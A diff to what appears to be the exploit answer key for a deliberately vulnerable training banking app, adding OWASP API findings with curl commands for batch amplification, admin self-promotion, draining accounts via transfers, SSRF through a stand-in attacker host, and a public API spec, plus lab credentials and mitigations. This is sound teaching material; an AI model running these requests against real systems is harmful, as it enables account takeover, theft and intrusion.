@@ -60,6 +60,11 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
  [28]  Excessive data exposure — /api/me returns SSN + password_md5 (Ch 32 API3)
  [29]  BOLA — /api/users/:id, /api/accounts/:id (Ch 32 API1)
  [30]  Improper inventory — /api/v1/users unauth (Ch 32 API9)
+ [30a] URC (API4) — POST /api/batch, no array-size cap (amplification) (Ch 20)
+ [30b] BFLA (API5) — /api/admin/users + /api/admin/users/:id/role, no role check (Ch 20)
+ [30c] Sensitive flow (API6) — POST /api/transfers, no ownership/limit/idempotency (Ch 20)
+ [30d] Unsafe consumption (API10) / SSRF (API7) — GET /api/fx?provider= trusts caller URL+reply (Ch 20)
+ [30e] Improper inventory (API9) — public /api/openapi.json + /api/swagger.json spec (Ch 20)
  [31]  CORS — origin reflection w/ credentials (Ch 17, 23)
  [32]  Cache poisoning — X-Forwarded-Host echoed in Link header (Ch 31)
  [33]  Debug endpoint exposed — /debug        (Ch 17)
@@ -761,6 +766,43 @@ EXPLOIT
 
 MITIGATION
   Retire old API versions; require auth on every route by middleware default.
+
+--------------------------------------------------------------------------------
+ [30a-e] API Security additions (Chapter 20) — routes/api.js
+--------------------------------------------------------------------------------
+Discovery:  GET /api/openapi.json (no auth) lists every endpoint incl the admin
+            and legacy ones; GET /api/v1/users (no auth) enumerates users+roles.
+Auth:       v1 JWT via POST /api/login (alice.chen/Password123!); alg=none forgery
+            works (Ch 18). Admin is julie.morgan (sub 6).
+
+  [30a] URC (API4) — POST /api/batch
+    curl -s -X POST localhost:3001/api/batch -H "Authorization: Bearer $T" \
+      -H 'Content-Type: application/json' -d '{"ids":[1,2,3,4,5]}'
+    # one request loops a DB read per id, no cap -> amplification + BOLA at scale (ssn).
+
+  [30b] BFLA (API5) — /api/admin/users + /api/admin/users/:id/role
+    curl -s localhost:3001/api/admin/users -H "Authorization: Bearer $T"        # customer token -> 200
+    curl -s -X POST localhost:3001/api/admin/users/1/role -H "Authorization: Bearer $T" \
+      -H 'Content-Type: application/json' -d '{"role":"admin"}'                  # self-promote to admin
+
+  [30c] Sensitive flow (API6) — POST /api/transfers
+    curl -s -X POST localhost:3001/api/transfers -H "Authorization: Bearer $T" \
+      -H 'Content-Type: application/json' \
+      -d '{"from_account":"4002-9999-0001","to_account":"4002-1188-0001","amount_cents":100000000}'
+    # no ownership/limit/idempotency -> drain the $1,000,000 audit account; replayable.
+
+  [30d] Unsafe consumption (API10) / SSRF (API7) — GET /api/fx?provider=
+    curl -s "localhost:3001/api/fx?to=EUR&amount=100&provider=http://<attacker>/rates.json" \
+      -H "Authorization: Bearer $T"
+    # fetches the caller-named URL (SSRF) and trusts its {rates:{EUR:...}} verbatim (no schema/bounds).
+
+  [30e] Improper inventory (API9) — public OpenAPI spec
+    curl -s localhost:3001/api/openapi.json     # full endpoint catalogue, no auth
+
+MITIGATION
+  Object + function authz on every endpoint (id===jwt.sub / role gate); cap arrays
+  + paginate + rate-limit; ownership/limit/idempotency on money movement; allow-list
+  outbound hosts + validate upstream responses; retire/auth old surface; hide the spec.
 
 --------------------------------------------------------------------------------
  [31] CORS — origin reflection w/ credentials
